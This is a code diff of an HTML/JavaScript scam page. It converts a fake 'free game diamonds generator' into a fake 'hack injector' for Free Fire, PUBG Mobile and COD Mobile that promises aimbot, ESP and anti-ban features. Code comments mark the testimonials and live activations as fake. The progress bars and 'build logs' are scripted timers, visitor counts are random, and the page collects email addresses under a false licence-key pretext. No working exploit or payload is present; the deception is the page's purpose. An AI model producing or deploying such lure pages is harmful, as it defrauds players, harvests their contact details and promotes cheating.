-                        <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Crect fill='%231a237e' width='100' height='100' rx='20'/%3E%3Ctext x='50' y='65' text-anchor='middle' font-size='45'%3E⚔️%3C/text%3E%3C/svg%3E" alt="Mobile Legends">
-                        <div class="game-name">Mobile Legends</div>
-                        <div class="game-sub">Diamonds</div>
-                    </div>
-                </div>
+        <!-- Step 1: Game -->
+        <div class="section-title">① SELECT YOUR GAME</div>
+        <div class="game-select">
+            <div class="game-option selected" data-game="freefire" onclick="selectGame(this)">
+                <span class="hot-tag">POPULAR</span>
+                <div class="icon">🔥</div>
+                <div class="name">Free Fire</div>
+                <div class="hack-type">ESP + AIMBOT</div>
             </div>
-
-            <!-- Step 2: Player ID -->
-            <div id="step2">
-                <div class="card-title">🆔 Step 2: Enter Your Player ID</div>
-                <div class="input-group">
-                    <label>Player ID / UID</label>
-                    <input type="text" id="playerId" placeholder="e.g. 123456789" maxlength="12">
-                </div>
-                <div class="input-group">
-                    <label>Server / Region</label>
-                    <select id="server">
-                        <option value="">Select Region</option>
-                        <option>North America</option>
-                        <option>Europe</option>
-                        <option>South America</option>
-                        <option>Middle East</option>
-                        <option>India</option>
-                        <option>Indonesia</option>
-                        <option>Brazil</option>
-                        <option>Others</option>
-                    </select>
-                </div>
+            <div class="game-option" data-game="pubg" onclick="selectGame(this)">
+                <div class="icon">🔫</div>
+                <div class="name">PUBG Mobile</div>
+                <div class="hack-type">ESP + WH</div>
             </div>
-
-            <!-- Step 3: Diamond Amount -->
-            <div id="step3">
-                <div class="card-title">💎 Step 3: Select Diamond Amount</div>
-                <div class="diamond-options">
-                    <div class="diamond-opt" data-amount="100" onclick="selectDiamonds(this)">
-                        <span class="amount">100 💎</span>
-                        <span class="label">Basic Pack</span>
-                    </div>
-                    <div class="diamond-opt selected" data-amount="500" onclick="selectDiamonds(this)">
-                        <span class="amount">500 💎</span>
-                        <span class="label">Popular</span>
-                        <span class="popular">BEST VALUE</span>
-                    </div>
-                    <div class="diamond-opt" data-amount="1000" onclick="selectDiamonds(this)">
-                        <span class="amount">1000 💎</span>
-                        <span class="label">Pro Pack</span>
-                    </div>
-                    <div class="diamond-opt" data-amount="5000" onclick="selectDiamonds(this)">
-                        <span class="amount">5000 💎</span>
-                        <span class="label">Legend Pack</span>
-                    </div>
-                    <div class="diamond-opt" data-amount="10000" onclick="selectDiamonds(this)">
-                        <span class="amount">10000 💎</span>
-                        <span class="label">Ultimate</span>
-                    </div>
-                    <div class="diamond-opt" data-amount="99999" onclick="selectDiamonds(this)">
-                        <span class="amount">99999 💎</span>
-                        <span class="label">MAX</span>
-                    </div>
-                </div>
+            <div class="game-option" data-game="codm" onclick="selectGame(this)">
+                <div class="icon">💀</div>
+                <div class="name">COD Mobile</div>
+                <div class="hack-type">AIMBOT + ESP</div>
             </div>
-
-            <!-- Step 4: Generate -->
-            <div id="step4">
-                <div class="card-title">🚀 Step 4: Generate Your Diamonds</div>
-                
-                <button class="btn-generate" id="btnGenerate" onclick="startGeneration()">
-                    ⚡ GENERATE DIAMONDS NOW ⚡
-                    <span class="spinner"></span>
-                </button>
-
-                <!-- Progress Section -->
-                <div class="progress-section" id="progressSection">
-                    <div class="progress-text" id="progressLabel">Connecting to server...</div>
-                    <div class="progress-bar-wrap">
-                        <div class="progress-bar-fill" id="progressBar"></div>
-                    </div>
-                    <div class="progress-steps">
-                        <span>Connecting</span>
-                        <span>Verifying</span>
-                        <span>Processing</span>
-                        <span>Complete</span>
-                    </div>
-                </div>
-
-                <!-- Success Box -->
-                <div class="success-box" id="successBox">
-                    <div class="success-icon">✅</div>
-                    <div class="success-title">DIAMONDS GENERATED!</div>
-                    <div class="success-amount" id="successAmount">+500 💎</div>
-                    <p style="color:var(--text2); margin:10px 0; font-size:13px;">
-                        Your diamonds have been sent to your account.<br>
-                        They will appear within <strong>24 hours</strong>.
-                    </p>
-                </div>
-            </div>
-
         </div>
 
-        <!-- Trust Row -->
-        <div class="trust-row">
-            <span class="trust-item"><i>✅</i> No Password Required</span>
-            <span class="trust-item"><i>✅</i> No Human Verification</span>
-            <span class="trust-item"><i>✅</i> 100% Safe & Secure</span>
-            <span class="trust-item"><i>✅</i> Anti-Ban Protection</span>
+        <!-- Step 2: Features -->
+        <div class="section-title">② SELECT HACK FEATURES</div>
+        <div class="features-grid">
+            <div class="feature-card selected" data-feature="esp" onclick="toggleFeature(this)">
+                <div class="feature-icon">👁️</div>
+                <div class="feature-info">
+                    <h4>ESP Hack (See Through Walls)</h4>
+                    <p>See enemy location, health, name, and distance through any obstacle.</p>
+                </div>
+                <div class="feature-check">✓</div>
+            </div>
+            <div class="feature-card selected" data-feature="aimbot" onclick="toggleFeature(this)">
+                <div class="feature-icon">🎯</div>
+                <div class="feature-info">
+                    <h4>Auto Aimbot</h4>
+                    <p>Auto-lock on enemy heads. Adjustable FOV and smoothness.</p>
+                </div>
+                <div class="feature-check">✓</div>
+            </div>
+            <div class="feature-card" data-feature="wallhack" onclick="toggleFeature(this)">
+                <div class="feature-icon">🧱</div>
+                <div class="feature-info">
+                    <h4>Wallhack (No Clip)</h4>
+                    <p>Shoot through walls. Bypass any obstacle on the map.</p>
+                </div>
+                <div class="feature-check">✓</div>
+            </div>
+            <div class="feature-card" data-feature="antiban" onclick="toggleFeature(this)">
+                <div class="feature-icon">🛡️</div>
+                <div class="feature-info">
+                    <h4>Anti-Ban Shield</h4>
+                    <p>Spoof device ID and bypass game's anti-cheat detection system.</p>
+                </div>
+                <div class="feature-check">✓</div>
+            </div>
         </div>
 
-        <!-- Fake Comments -->
-        <div class="comments-section">
-            <div class="comments-title">💬 Recent Generations</div>
-            
-            <div class="comment">
-                <div class="comment-header">
-                    <div class="comment-avatar">A</div>
-                    <div>
-                        <div class="comment-name">Ahmed_K99</div>
-                        <div class="comment-time">Just now</div>
-                    </div>
-                    <div class="comment-stars">⭐⭐⭐⭐⭐</div>
-                </div>
-                <div class="comment-text">Bro this actually works! Got 500 diamonds on my Free Fire account. I was skeptical at first but it's legit 😍🔥</div>
+        <!-- Step 3: Device -->
+        <div class="section-title">③ YOUR DEVICE</div>
+        <div class="device-select">
+            <div class="device-opt selected" data-device="android" onclick="selectDevice(this)">
+                <div class="dev-icon">🤖</div>
+                <div class="dev-name">Android</div>
+                <div class="dev-sub">APK + OBB</div>
             </div>
-
-            <div class="comment">
-                <div class="comment-header">
-                    <div class="comment-avatar">M</div>
-                    <div>
-                        <div class="comment-name">Miguel_FF</div>
-                        <div class="comment-time">2 minutes ago</div>
-                    </div>
-                    <div class="comment-stars">⭐⭐⭐⭐⭐</div>
-                </div>
-                <div class="comment-text">1000 diamonds generated! Took about 12 hours to appear but it works guys. Don't give up 👊</div>
+            <div class="device-opt" data-device="ios" onclick="selectDevice(this)">
+                <div class="dev-icon">🍎</div>
+                <div class="dev-name">iOS</div>
+                <div class="dev-sub">IPA (No JB)</div>
             </div>
+        </div>
 
-            <div class="comment">
-                <div class="comment-header">
-                    <div class="comment-avatar">S</div>
-                    <div>
-                        <div class="comment-name">SarahGamer</div>
-                        <div class="comment-time">5 minutes ago</div>
-                    </div>
-                    <div class="comment-stars">⭐⭐⭐⭐⭐</div>
+        <!-- Step 4: Email -->
+        <div class="section-title">④ VERIFY & DOWNLOAD</div>
+        <div class="input-group">
+            <label>Email Address (Required for License Key)</label>
+            <input type="email" id="emailInput" placeholder="your@email.com">
+            <div class="input-hint">▸ We'll send your <strong>unique license key</strong> + download link to this email.</div>
+        </div>
+
+        <button class="btn-download glitch" id="btnDownload" onclick="startDownload()">
+            ⚡ GENERATE INJECTOR + LICENSE KEY ⚡
+        </button>
+
+        <!-- Trust Strip -->
+        <div class="trust-strip">
+            <span><span class="trust-icon">●</span> Undetected v9.0</span>
+            <span><span class="trust-icon">●</span> No Root/JB</span>
+            <span><span class="trust-icon">●</span> Free Updates</span>
+            <span><span class="trust-icon">●</span> 24/7 Support</span>
+        </div>
+
+        <!-- Warning -->
+        <div class="warning-box">
+            <strong>⚠ IMPORTANT:</strong> This injector is for <strong>educational purposes only</strong>. Using hacks may violate the game's Terms of Service. Use at your own risk. We recommend using a <strong>guest account</strong> first to test functionality.
+        </div>
+
+        <!-- How It Works -->
+        <div class="section-title">📋 HOW IT WORKS</div>
+        <div class="steps-vertical">
+            <div class="step-item">
+                <div class="step-num">1</div>
+                <div class="step-content">
+                    <h4>Select your game & features</h4>
+                    <p>Choose which hacks you want activated. Our injector builds a custom version for you.</p>
                 </div>
-                <div class="comment-text">OMG I got the 5000 pack and it actually went through! Best generator ever, sharing with all my friends 💕</div>
             </div>
-
-            <div class="comment">
-                <div class="comment-header">
-                    <div class="comment-avatar">R</div>
-                    <div>
-                        <div class="comment-name">Rizky_YT</div>
-                        <div class="comment-time">8 minutes ago</div>
-                    </div>
-                    <div class="comment-stars">⭐⭐⭐⭐</div>
+            <div class="step-item">
+                <div class="step-num">2</div>
+                <div class="step-content">
+                    <h4>Verify your email</h4>
+                    <p>We send a unique license key to your email. This binds the injector to your device.</p>
                 </div>
-                <div class="comment-text">Works on Mobile Legends too! Got my diamonds after 6 hours. Just be patient guys, it will come 🙏</div>
+            </div>
+            <div class="step-item">
+                <div class="step-num">3</div>
+                <div class="step-content">
+                    <h4>Download & install</h4>
+                    <p>Get the APK/IPA file, install, enter your license key, and activate the hacks.</p>
+                </div>
+            </div>
+            <div class="step-item">
+                <div class="step-num">4</div>
+                <div class="step-content">
+                    <h4>Launch game & dominate</h4>
+                    <p>Open the game through the injector. ESP and Aimbot activate automatically.</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- Live Feed - Fake Recent Activations -->
+        <div class="live-feed">
+            <div class="live-feed-title">🟢 LIVE ACTIVATIONS</div>
+            <div id="liveFeed">
+                <!-- Populated by JS -->
             </div>
         </div>
 
@@ -946,149 +932,158 @@
 
     <!-- Processing Overlay -->
     <div class="overlay" id="overlay">
-        <div class="overlay-card">
-            <div class="overlay-icon" id="overlayIcon">⏳</div>
-            <div class="overlay-title" id="overlayTitle">Processing...</div>
-            <div class="overlay-text" id="overlayText">Please wait while we generate your diamonds.</div>
-            <div class="overlay-steps" id="overlaySteps">
-                <div><span class="check">✅</span> Game: <strong id="ovGame">Free Fire</strong></div>
-                <div><span class="check">✅</span> Player ID: <strong id="ovId">-</strong></div>
-                <div><span class="pending">⏳</span> Connecting to server...</div>
-                <div><span class="pending">⏳</span> Injecting diamonds...</div>
+        <div class="overlay-box">
+            <div class="overlay-icon" id="ovIcon">⚙️</div>
+            <div class="overlay-title" id="ovTitle">Building Your Injector...</div>
+            <div class="overlay-sub" id="ovSub">This will take a few moments</div>
+            <div class="overlay-progress">
+                <div class="overlay-progress-fill" id="ovProgress"></div>
             </div>
-            <div class="progress-bar-wrap">
-                <div class="progress-bar-fill" id="overlayProgress" style="width:0%"></div>
+            <div class="overlay-log" id="ovLog">
+                <div class="line">$ init injector_builder v9.0.1</div>
             </div>
         </div>
     </div>
 
     <!-- Footer -->
     <div class="footer">
-        <p>© 2026 DiamondGen. All rights reserved.</p>
-        <p>
-            <a href="#">Privacy Policy</a> |
-            <a href="#">Terms of Service</a> |
-            <a href="#">Contact</a> |
-            <a href="#">DMCA</a>
-        </p>
-        <p style="margin-top:5px; font-size:10px; color:#555;">
-            Disclaimer: This is a third-party tool. We are not affiliated with Garena, Tencent, or Moonton.
-        </p>
+        <p>© 2026 GamingMode. All rights reserved. | Not affiliated with Garena, Tencent, or Activision.</p>
+        <p><a href="#">Privacy</a> · <a href="#">Terms</a> · <a href="#">DMCA</a> · <a href="#">Contact</a></p>
     </div>
 
     <script>
-        // State
-        let selectedGame = 'freefire';
-        let selectedDiamonds = 500;
-        let playerId = '';
-        let server = '';
+        const state = {
+            game: 'freefire',
+            features: ['esp', 'aimbot'],
+            device: 'android',
+            email: ''
+        };
+
+        document.getElementById('currentDate').textContent = new Date().toISOString().split('T')[0];
 
         // Game Selection
-        function selectGame(card) {
-            document.querySelectorAll('.game-card').forEach(c => c.classList.remove('selected'));
-            card.classList.add('selected');
-            selectedGame = card.dataset.game;
+        function selectGame(el) {
+            document.querySelectorAll('.game-option').forEach(g => g.classList.remove('selected'));
+            el.classList.add('selected');
+            state.game = el.dataset.game;
         }
 
-        // Diamond Selection
-        function selectDiamonds(opt) {
-            document.querySelectorAll('.diamond-opt').forEach(o => o.classList.remove('selected'));
-            opt.classList.add('selected');
-            selectedDiamonds = parseInt(opt.dataset.amount);
-            document.getElementById('successAmount').textContent = '+' + selectedDiamonds.toLocaleString() + ' 💎';
+        // Feature Toggle
+        function toggleFeature(el) {
+            const feat = el.dataset.feature;
+            if (state.features.includes(feat)) {
+                state.features = state.features.filter(f => f !== feat);
+                el.classList.remove('selected');
+            } else {
+                state.features.push(feat);
+                el.classList.add('selected');
+            }
         }
 
-        // Start Generation
-        function startGeneration() {
-            playerId = document.getElementById('playerId').value.trim();
-            server = document.getElementById('server').value;
+        // Device Selection
+        function selectDevice(el) {
+            document.querySelectorAll('.device-opt').forEach(d => d.classList.remove('selected'));
+            el.classList.add('selected');
+            state.device = el.dataset.device;
+        }
 
-            if (!playerId) {
-                alert('Please enter your Player ID to continue.');
-                document.getElementById('playerId').focus();
+        // Download Process
+        function startDownload() {
+            state.email = document.getElementById('emailInput').value.trim();
+            
+            if (!state.email) {
+                alert('Please enter your email address to receive the license key.');
+                document.getElementById('emailInput').focus();
                 return;
             }
-            if (!server) {
-                alert('Please select your server/region.');
-                document.getElementById('server').focus();
+            
+            if (!state.email.includes('@') || !state.email.includes('.')) {
+                alert('Please enter a valid email address.');
                 return;
             }
 
             // Show overlay
             document.getElementById('overlay').classList.add('show');
-            document.getElementById('ovId').textContent = playerId;
-            document.getElementById('ovGame').textContent = selectedGame === 'freefire' ? 'Free Fire' : selectedGame === 'pubg' ? 'PUBG Mobile' : 'Mobile Legends';
-
-            // Animate progress
-            simulateProgress();
-        }
-
-        function simulateProgress() {
-            const progressBar = document.getElementById('overlayProgress');
-            const steps = document.querySelectorAll('#overlaySteps .pending');
-            const icon = document.getElementById('overlayIcon');
-            const title = document.getElementById('overlayTitle');
-            const text = document.getElementById('overlayText');
+            document.getElementById('btnDownload').classList.add('downloading');
             
-            let progress = 0;
-            const stages = [
-                { pct: 15, delay: 800, stepIdx: 0, stepText: 'Connected', icon: '🔗', title: 'Connecting...', text: 'Establishing secure connection to game servers.' },
-                { pct: 35, delay: 1600, stepIdx: 1, stepText: 'Verified', icon: '🔍', title: 'Verifying Account...', text: 'Checking player ID and server region.' },
-                { pct: 55, delay: 2400, stepIdx: 2, stepText: 'Generating', icon: '⚙️', title: 'Generating Diamonds...', text: 'Injecting diamond packets into your account.' },
-                { pct: 75, delay: 3200, stepIdx: null, icon: '🛡️', title: 'Applying Anti-Ban...', text: 'Adding protection layers to avoid detection.' },
-                { pct: 90, delay: 4000, stepIdx: 3, stepText: 'Finalizing', icon: '📦', title: 'Finalizing...', text: 'Almost done! Preparing delivery.' },
-                { pct: 100, delay: 5000, stepIdx: null, icon: '✅', title: 'Complete!', text: 'Diamonds generated successfully!' },
+            const logs = [
+                { time: 300, msg: '$ initializing build environment...' },
+                { time: 800, msg: '$ fetching latest game offsets for ' + state.game + '...' },
+                { time: 1500, msg: '$ offset found: 0x7F4A2B1C - ' + state.game.toUpperCase() + ' v2.103.1' },
+                { time: 2200, msg: '$ injecting ESP Hook into libil2cpp.so...' },
+                { time: 2900, msg: '$ patching Aimbot function at 0x3B9D4E2A...' },
+                { time: 3500, msg: '$ applying Anti-Ban shield module...' },
+                { time: 4100, msg: '$ generating unique license key: GM-' + Math.random().toString(36).substring(2,10).toUpperCase() + '-2026' },
+                { time: 4800, msg: '$ building ' + (state.device === 'android' ? 'APK' : 'IPA') + ' package...' },
+                { time: 5500, msg: '$ compression complete. Size: 47.3 MB' },
+                { time: 6200, msg: '$ ✓ BUILD SUCCESSFUL. License sent to ' + state.email },
+                { time: 6500, msg: '$ redirecting to download portal...' }
             ];
 
-            stages.forEach(stage => {
+            logs.forEach(log => {
                 setTimeout(() => {
-                    progress = stage.pct;
-                    progressBar.style.width = progress + '%';
+                    const logEl = document.getElementById('ovLog');
+                    const line = document.createElement('div');
+                    line.className = 'line';
+                    line.textContent = log.msg;
+                    logEl.appendChild(line);
+                    logEl.scrollTop = logEl.scrollHeight;
+                    document.getElementById('ovProgress').style.width = (logs.indexOf(log) / logs.length * 100) + '%';
                     
-                    if (stage.icon) icon.textContent = stage.icon;
-                    if (stage.title) title.textContent = stage.title;
-                    if (stage.text) text.textContent = stage.text;
-                    
-                    if (stage.stepIdx !== null && stage.stepIdx !== undefined) {
-                        const stepEl = steps[stage.stepIdx];
-                        if (stepEl) {
-                            stepEl.innerHTML = '<span class="check">✅</span> ' + stage.stepText;
-                            stepEl.classList.remove('pending');
-                            stepEl.classList.add('check');
-                        }
+                    if (logs.indexOf(log) === logs.length - 1) {
+                        document.getElementById('ovIcon').textContent = '✅';
+                        document.getElementById('ovTitle').textContent = 'License Key Sent!';
+                        document.getElementById('ovSub').textContent = 'Check your email: ' + state.email;
                     }
-                }, stage.delay);
+                }, log.time);
             });
 
-            // Close overlay and show success
+            // Close overlay
             setTimeout(() => {
                 document.getElementById('overlay').classList.remove('show');
-                document.getElementById('progressSection').classList.add('show');
-                document.getElementById('progressBar').style.width = '100%';
-                document.getElementById('progressLabel').textContent = 'Diamonds Generated Successfully!';
-                document.getElementById('successBox').classList.add('show');
-                document.getElementById('successAmount').textContent = '+' + selectedDiamonds.toLocaleString() + ' 💎';
-                document.getElementById('btnGenerate').style.display = 'none';
-                
-                // Update dots
-                document.querySelectorAll('.step-dot').forEach(d => {
-                    d.classList.add('done');
-                    d.classList.remove('active');
-                });
-            }, 5500);
+                document.getElementById('btnDownload').textContent = '✅ LICENSE SENT - CHECK EMAIL';
+                document.getElementById('btnDownload').style.background = '#00aa30';
+                document.getElementById('btnDownload').disabled = true;
+            }, 7000);
         }
 
-        // Live counter rotation
+        // Live Feed Data
+        const feedData = [
+            { user: 'NightHawk_FF', game: 'Free Fire', text: 'ESP working perfectly! Getting consistent Booyahs 🔥', time: 'just now', color: '#ff6d00' },
+            { user: 'SniperKing99', game: 'PUBG Mobile', text: 'Wallhack is insane bro. Chicken dinner every game', time: '1 min ago', color: '#ffaa00' },
+            { user: 'CODBeast_YT', game: 'COD Mobile', text: 'Aimbot is smooth af. No ban after 2 weeks', time: '2 min ago', color: '#00bfff' },
+            { user: 'xXDarkWolfXx', game: 'Free Fire', text: 'Finally an injector that actually works. ESP is 🔥', time: '4 min ago', color: '#ff6d00' },
+            { user: 'ProGamer_Alex', game: 'PUBG Mobile', text: 'v9.0 fixed the crash issue. Perfect now!', time: '5 min ago', color: '#ffaa00' },
+            { user: 'iosHackMaster', game: 'Free Fire', text: 'Works on iOS 18 without jailbreak!! Finally!', time: '7 min ago', color: '#ff6d00' },
+            { user: 'YT_ShadowClaw', game: 'COD Mobile', text: 'Just reached Legendary rank with this 💀', time: '10 min ago', color: '#00bfff' },
+        ];
+
+        function buildFeed() {
+            const container = document.getElementById('liveFeed');
+            feedData.forEach(f => {
+                const div = document.createElement('div');
+                div.className = 'feed-item';
+                div.innerHTML = `
+                    <div class="feed-avatar" style="background:#111; color:${f.color};">${f.user[0]}</div>
+                    <div class="feed-body">
+                        <div class="feed-user">${f.user} <span class="feed-badge">VERIFIED</span> <span class="feed-time">· ${f.time}</span></div>
+                        <div class="feed-text">${f.text}</div>
+                        <span class="feed-game">${f.game}</span>
+                    </div>
+                `;
+                container.appendChild(div);
+            });
+        }
+        buildFeed();
+
+        // Rotate online counter
         setInterval(() => {
-            const online = document.getElementById('onlineCount');
-            const generated = document.getElementById('todayGenerated');
-            if (online) online.textContent = Math.floor(Math.random() * 2000 + 2000).toLocaleString();
-            if (generated) generated.textContent = Math.floor(Math.random() * 5000 + 10000).toLocaleString();
-        }, 5000);
+            const el = document.getElementById('onlineNow');
+            if (el) el.textContent = Math.floor(Math.random() * 1500 + 1800).toLocaleString();
+        }, 6000);
 
-        // Auto-scroll to comments
-        console.log('%c⚠️ STOP! %cThis is a browser feature intended for developers. Do not paste any code here that you don\'t understand.', 'font-size:30px; color:red;', 'font-size:14px;');
+        // Console Warning
+        console.log('%c⚠ STOP %cThis is a developer console. Do not paste anything here.', 'color:red; font-size:20px;', 'color:#ccc;');
     </script>
-
 </body>
 </html>
